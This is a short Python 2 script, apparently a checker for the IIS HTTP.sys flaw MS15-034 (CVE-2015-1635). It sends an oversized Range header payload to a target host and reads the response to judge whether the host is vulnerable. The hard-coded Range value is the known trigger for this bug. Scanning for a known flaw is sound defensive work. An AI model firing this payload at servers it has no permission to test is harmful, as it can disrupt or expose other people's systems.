# MS15-034_checker.py
# CVE-2015-1635
# description: Checks if the host is vulnerable to MS15-034
# reference: https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
# author: @shipcod3

import sys, requests

def usage():
    print "Usage: python MS15-034_checker.py https://iamanexampleonly.com"

def main(argv):

    print " -=MS15-034 / CVE-2015-1635: HTTP.sys Remote Code Execution Checker=-\n"

    if len(argv) < 2:
         return usage()

    payload= "bytes=18-18446744073709551615"
    rhost = sys.argv[1]

    try:
        r = requests.get("{}/iisstart.htm".format(rhost), headers={"Range": payload})
        print "[+] Sending the payload: " + payload + " in Range header"

        if r.status_code == 416 and 'Requested Range Not Satisfiable' in r.reason:
            print "[-] Vulnerable"

        elif 'The request has an invalid header name' in r.reason:
            print "[+] Not Vulnerable - Patched"

        else:
            print "[+] Not Vulnerable"

    except Exception as e:
        print "Error! Check if host is online.."

if __name__ == "__main__":
    main(sys.argv)
